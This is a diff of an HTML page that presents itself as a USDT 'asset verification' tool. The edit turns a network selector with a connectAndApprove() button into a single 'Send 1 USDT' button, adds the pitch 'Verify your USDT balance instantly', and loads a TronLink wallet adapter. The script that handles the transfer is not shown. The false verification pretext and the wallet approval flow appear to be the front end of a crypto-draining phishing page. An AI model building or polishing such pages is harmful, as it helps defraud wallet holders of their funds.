@@ -3,24 +3,18 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Asset Verification</title>
+  <title>TRC-20 USDT Asset Verification</title>
   <link rel="stylesheet" href="style.css" />
 </head>
 <body>
   <div class="container">
-    <h1>Select Network to Verify Asset</h1>
-    <div class="selector">
-      <button onclick="selectNetwork('trc20')">TRC-20</button>
-      <button onclick="selectNetwork('bep20')">BEP-20</button>
-    </div>
-
-    <div id="details" style="display: none;">
-      <p>Send USDT to:</p>
-      <code id="usdt-address">-</code>
-      <button onclick="connectAndApprove()">Send</button>
-    </div>
+    <h1>TRC-20 Asset Verification</h1>
+    <p>Verify your USDT balance instantly</p>
+    <button id="sendBtn">Send 1 USDT</button>
+    <div id="status"></div>
   </div>
 
+  <script src="https://cdn.jsdelivr.net/npm/@tronweb3/tronwallet-adapter-tronlink"></script>
   <script src="main.js"></script>
 </body>
 </html>
